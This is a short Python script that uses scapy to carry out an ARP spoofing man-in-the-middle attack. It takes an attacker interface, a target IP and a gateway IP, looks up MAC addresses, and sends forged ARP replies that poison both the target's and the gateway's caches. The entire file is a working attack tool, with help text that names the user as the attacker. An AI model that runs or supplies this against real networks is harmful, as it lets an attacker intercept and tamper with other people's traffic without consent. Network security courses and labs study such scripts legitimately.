#!/usr/bin/env python3

import subprocess
import scapy.all as scapy
import argparse
import re

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="mitm_interface", help="Attacker's interface to execute Man-in-the-Middle (MITM) attack (i.e. eth0)")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target's IP address (i.e. 10.1.1.15)")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address of Target (i.e. 10.1.1.1)")
    options = parser.parse_args()
    if not options.mitm_interface:
        parser.error("[-] Please specify an interface to execute the attack from, see --help for more info.")
    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, see --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, see --help for more info.")
    return options


def get_mac(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def mitm_mac(mitm_interface):
    parse_mac = argparse.ArgumentParser()
    ifconfig_snapshot = subprocess.check_output(["ifconfig", mitm_interface])
    mitm_mac_address = re.findall(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_snapshot))[0]
    return mitm_mac_address


def arp_spoof_target(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet)


# target_ip = input("Target IP Address: ")
# target_mac = input("Target MAC Address: ")
# gateway_ip = input("Gateway IP Address to spoof: ")
# gateway_mac = input("Gateway MAC Address: ")


options = get_arguments()
print("[ ] Script Started.")
print("[+] Querying for MAC Address..")
mitm_mac_address = mitm_mac(options.mitm_interface)
print("[+] Spoofing Target..")
arp_spoof_target(options.target_ip, options.gateway_ip)
print("[+] Spoofed Target!")
print("[+] Spoofing Gateway..")
arp_spoof_target(options.gateway_ip, options.target_ip)
print("[+] Spoofed Gateway!")
print("[X] Script completed!")